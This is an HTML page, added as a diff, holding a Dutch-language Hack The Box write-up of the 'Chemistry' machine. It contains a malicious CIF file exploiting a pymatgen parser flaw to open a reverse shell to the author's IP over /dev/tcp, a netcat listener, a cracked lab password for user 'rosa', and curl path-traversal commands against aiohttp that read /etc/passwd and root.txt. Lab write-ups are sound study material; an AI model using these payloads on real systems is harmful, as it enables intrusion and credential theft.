@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Als eerst zal ik gaan kijken welke poorten er openstaan. Dit zal ik gaan doen aan de hand van het volgende commando.
+nmap -p- -sCV 10.129.175.140 -vvvv Bij het scannen zullen we zien dat er 2 tcp poorten openstaan.
+poort 22 staat voor ssh poort 5000 staat voor upnp? (Universal Plug and Play) Als we op de webbrowser zullen gaan zoeken naar het ip adres zullen we deze niet vinden omdat er geen op poort 80 of 443 openstaat. Maar als we hiervoor de poort nummer 5000 zullen gaan gebruiken zullen we zien dat een we een webpagina te voorschijn komt.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/writeup-chemistry/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Als eerst zal ik gaan kijken welke poorten er openstaan. Dit zal ik gaan doen aan de hand van het volgende commando.
+nmap -p- -sCV 10.129.175.140 -vvvv Bij het scannen zullen we zien dat er 2 tcp poorten openstaan.
+poort 22 staat voor ssh poort 5000 staat voor upnp? (Universal Plug and Play) Als we op de webbrowser zullen gaan zoeken naar het ip adres zullen we deze niet vinden omdat er geen op poort 80 of 443 openstaat. Maar als we hiervoor de poort nummer 5000 zullen gaan gebruiken zullen we zien dat een we een webpagina te voorschijn komt.">
+  <meta itemprop="wordCount" content="649">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Als eerst zal ik gaan kijken welke poorten er openstaan. Dit zal ik gaan doen aan de hand van het volgende commando.
+nmap -p- -sCV 10.129.175.140 -vvvv Bij het scannen zullen we zien dat er 2 tcp poorten openstaan.
+poort 22 staat voor ssh poort 5000 staat voor upnp? (Universal Plug and Play) Als we op de webbrowser zullen gaan zoeken naar het ip adres zullen we deze niet vinden omdat er geen op poort 80 of 443 openstaat. Maar als we hiervoor de poort nummer 5000 zullen gaan gebruiken zullen we zien dat een we een webpagina te voorschijn komt.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/writeup-chemistry/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <p>Als eerst zal ik gaan kijken welke poorten er openstaan. Dit zal ik gaan doen aan de hand van het volgende commando.</p>
+<pre tabindex="0"><code>nmap -p- -sCV 10.129.175.140 -vvvv
+</code></pre><p>Bij het scannen zullen we zien dat er 2 tcp poorten openstaan.</p>
+<p><img src="53215244.png" alt="image-20241104-132340.png"></p>
+<pre tabindex="0"><code>poort 22 staat voor ssh
+
+poort 5000 staat voor upnp? (Universal Plug and Play)
+</code></pre><p>Als we op de webbrowser zullen gaan zoeken naar het ip adres zullen we deze niet vinden omdat er geen op poort 80 of 443 openstaat. Maar als we hiervoor de poort nummer 5000 zullen gaan gebruiken zullen we zien dat een we een webpagina te voorschijn komt.</p>
+<p><img src="53411844.png" alt="image-20241104-132746.png"></p>
+<p>Ik ben eerst gaan proberen inloggen met het admin account maar ik kon er niet op geraken doordat het niet de juiste credentials waren. Wat ik dan ben gaan doen is mij gaan registreren met de user “test“ en het password “test“.</p>
+<p><img src="53346316.png" alt="image-20241104-133457.png"></p>
+<p>Zoals je nu kunt zien kunnen we een CIF bestand gaan uploaden. We kunnen hiervoor eerst een voorbeeld bestand downloaden. Dit is wat ik van het gedownloade bestand te zien kreeg.</p>
+<p><img src="53084169.png" alt="image-20241104-133914.png"></p>
+<p>Hieruit kan je niet veel data opmaken. Dus ben ik eens gaan zoeken naar een CVE voor CIF bestanden.</p>
+<p><img src="53510145.png" alt="image-20241104-134423.png"></p>
+<p>In deze pagina staat er CVE die ik kan gaan gebruiken voor het uploaden van een CIF file waarmee ik connectie zal krijgen met de server.</p>
+<pre tabindex="0"><code>data_5yOhtAoR  
+_audit_creation_date            2018-06-08  
+_audit_creation_method          &#34;Pymatgen CIF Parser Arbitrary Code Execution Exploit&#34;  
+  
+loop_  
+_parent_propagation_vector.id  
+_parent_propagation_vector.kxkykz  
+k1 [0 0 0]  
+  
+_space_group_magn.transform_BNS_Pp_abc  &#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&#34;__sub&#34; + &#34;classes__&#34;]) () if d.__name__ == &#34;BuiltinImporter&#34;][0].load_module (&#34;os&#34;).system (&#34;/bin/bash -c \ &#39;sh -i &gt;&amp; /dev/tcp/10.10.14.76/5555 0&gt;&amp;1\&#39;&#34;);0,0,0&#39;  
+  
+  
+_space_group_magn.number_BNS  62.448  
+_space_group_magn.name_BNS  &#34;P  n&#39;  m  a&#39;  &#34;
+</code></pre><p><strong>ip address 10.10.14.76 (ip dat ik gebruik op mijn eigen machine)</strong></p>
+<p><strong>poort 5555 (poort dat ik gebruik waarop het moet luisteren)</strong></p>
+<p>Aan de hand van deze code, zullen we een .cif file moeten maken en deze moeten gaan uploaden op de server. Eens deze file is upgeload zullen we op view gaan drukken en zullen we op een apparte terminal een connectie gaan maken met de server.</p>
+<p>dit zal ik doen aan de hand van het volgende commando.</p>
+<pre tabindex="0"><code>nc -nlvp 5555
+</code></pre><p>zoals je nu kunt zien hebben we een shell met de server.</p>
+<p><img src="53673989.png" alt="image-20241104-143211.png"></p>
+<p>We zullen het volgende commando gaan gebruiken voor een betere en mooiere shell te hebben.</p>
+<pre tabindex="0"><code>python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;
+</code></pre><p><img src="53673995.png" alt="image-20241104-143322.png"></p>
+<p>als we naar de instances zullen gaan, zien we daar een database. Als we deze database zullen gaan bekijken met het commando “cat” Dan krijgen we het volgende te zien.</p>
+<p><img src="53542927.png" alt="image-20241104-144231.png"></p>
+<p>wse zien allemaal hashes. Als we nu via <a href="https://crackstation.net/">https://crackstation.net/</a> zullen gaan zoeken naar wachtwoorden, zullen we het wachtwoord van de user rosa te zien krijgen. Dit password is “</p>
+<table>
+  <thead>
+      <tr>
+          <th></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>unicorniosrosados</td>
+      </tr>
+  </tbody>
+</table>
+<p>“</p>
+<p>als we nu gaan veranderen van user door het commando te gebruiken:</p>
+<pre tabindex="0"><code>su user
+</code></pre><p>zullen we het wachtwoord moeten gaan ingeven. Eens dit wachtweoord is ingegeven kunnen we naar de home folder gaan en zullen we een user.txt zien. Dit is de eerste flag.</p>
+<p><img src="53739529.png" alt="image-20241104-144713.png"></p>
+<p>Als ik nu als user rosa het volgende commando zal gaan uitvoeren:</p>
+<pre tabindex="0"><code>netstat -l
+</code></pre><p>Hiermee kunnen we gaan zien wat er allemaal draait. We zullen zien dat er nog een andere webpagina is. Deze is localhost:http-alt (Wat dus wilt zeggen op poort 8080).</p>
+<p>ik ben eens gaan kijken op welke server deze draaide. Hieronder zal je zien dat deze op aiohttp draait.</p>
+<p>![[Pasted image 20250122150254.png]]</p>
+<p>Dus ik ben gaan zoeken naar een cve voor deze server.</p>
+<p><img src="53510162.png" alt="image-20241104-150015.png"></p>
+<p>Hier zien we dat we met dit kunnen gaan kijken of dat we de /etc/shadow file kunnen open krijgen aan de hand van het volgende commando:</p>
+<pre tabindex="0"><code>curl -s --path-as-is http://localhost:8080/assets/../../../../etc/passwd
+</code></pre><p>Zoals je kan zien kunnen we de file bekijken.</p>
+<p><img src="53641229.png" alt="image-20241104-150301.png"></p>
+<p>dus als we nu in plaats van de etc/shadow file zullen gaan bekijken, kunnen we dit nu gaan doen voor de root.txt onze second flag.</p>
+<p>Zoals je hieronder zult kunnen zien hebben we de 2de flag gevonden aan de hand van het volgende commando.</p>
+<pre tabindex="0"><code>curl -s --path-as-is http://localhost:8080/assets/../../../../root/root.txt
+</code></pre><p><img src="53641235.png" alt="image-20241104-150438.png"></p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
